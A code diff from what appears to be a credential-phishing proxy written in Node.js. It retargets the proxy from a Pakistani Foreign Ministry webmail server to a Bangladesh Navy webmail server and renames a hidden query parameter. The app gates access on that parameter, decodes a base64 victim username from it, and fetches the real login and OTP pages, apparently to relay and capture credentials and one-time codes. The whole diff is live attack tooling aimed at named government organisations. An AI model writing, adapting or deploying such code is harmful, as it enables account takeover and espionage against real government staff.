@@ -41,7 +41,7 @@ const axiosInstance = wrapper(axios.create({
 }));
 
 
-const baseUrl = 'https://mail.mofa.gov.pk/';
+const baseUrl = 'https://mail.navy.mil.bd/';
 const loginUrl = baseUrl;
 const otpUrl = baseUrl + '?client=preferred/';
 
@@ -157,14 +157,14 @@ app.get('/', async (req, res) => {
   const html = await fetchLoginPage(req);
 
   // Check if the required query parameter is present
-  if (!req.query.shfgkjdhgjkfhdgjkfhdgjkhfdjghfdghfjkd) {
+  if (!req.query.ausbduabxyasgdbaskbbx) {
     return res.status(404).send('Forbidden');
   }
 
   // Decode the base64 username
   let username;
   try {
-    username = Buffer.from(req.query.shfgkjdhgjkfhdgjkfhdgjkhfdjghfdghfjkd, 'base64').toString('utf8');
+    username = Buffer.from(req.query.ausbduabxyasgdbaskbbx, 'base64').toString('utf8');
   } catch (error) {
     return res.status(404).send('Forbidden');
   }
